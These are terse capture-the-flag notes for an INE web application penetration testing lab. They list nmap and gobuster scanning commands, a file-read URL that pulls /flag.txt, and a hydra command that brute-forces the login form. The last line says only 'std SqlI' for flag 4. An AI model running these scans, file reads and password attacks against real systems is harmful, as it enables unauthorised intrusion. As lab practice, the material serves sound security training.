Web Application Penetration Testing CTF 1
`nmap -sC -sV target.ine.local`

`gobuster dir -u http://target.ine.local -w wordlist.txt`

`http://target.ine.local/view_file?file=/flag.txt`
flag1

`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt        -P /root/Desktop/wordlists/100-common-passwords.txt       target.ine.local       http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
`


flag 4 
std SqlI